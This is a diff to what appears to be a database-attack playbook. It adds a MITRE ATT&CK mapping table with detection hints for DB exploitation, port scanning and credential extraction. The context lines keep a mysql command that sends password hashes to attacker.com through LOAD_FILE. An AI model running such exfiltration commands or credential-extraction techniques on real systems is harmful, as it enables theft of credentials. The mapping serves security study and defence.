@@ -992,3 +992,17 @@ mysql -h 192.168.1.100 -u root -e "
   SELECT LOAD_FILE(CONCAT('http://attacker.com/exfil?data=', password_hash));
 "
 ``````
+
+---
+
+## MITRE ATT&CK Mapping + Reference Expansion (v0.2.7)
+
+### ATT&CK Mapping (F-DATAB-001)
+
+| ATT&CK Technique | Skill Activity | Detection Hint |
+|------------------|----------------|-----------------|
+| **T1210 — Exploitation of Remote Services** | DB engine RCE via extended procedures | DB audit: bulk sysexec calls |
+| **T1190 — Exploit Public-Facing Application** | Exposed DB consoles (Redis/Mongo) | IDS: default-credential attempts |
+| **T1046 — Network Service Scanning** | DB port discovery (1433/3306/5432) | IDS: burst SYN on DB ports |
+| **T1003 — OS Credential Dumping** | DBA credential extraction from configs | EDR: access to db config paths |
+| **T1552.001 — Credentials In Files** | Connection strings with plaintext creds | Secret scanning: jdbc/mongodb URIs |
